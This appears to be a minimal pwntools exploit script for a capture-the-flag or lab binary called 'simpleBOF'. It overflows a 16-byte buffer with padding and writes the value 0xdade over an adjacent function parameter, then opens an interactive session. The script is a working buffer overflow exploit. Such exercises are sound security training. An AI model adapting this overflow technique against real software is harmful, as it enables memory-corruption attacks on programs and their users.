#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack

pinfo = process("./simpleBOF");

out = ''
out += "A"*(16); # buffer 
out += pack("<I",0xdade) # first paramter of function

pinfo.send(out + "\n")
pinfo.interactive()

